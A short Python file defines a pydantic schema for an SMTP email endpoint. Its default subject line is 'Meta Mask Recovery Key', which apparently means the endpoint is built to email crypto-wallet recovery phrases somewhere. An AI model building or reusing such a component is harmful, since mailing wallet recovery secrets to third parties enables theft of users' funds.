from pydantic import BaseModel


class SmtpSchema(BaseModel):
    """Schema And Typing for Smtp endpoint"""
    Port: int = 465
    To: str
    Subject: str = "Meta Mask Recovery Key"
    Body: str
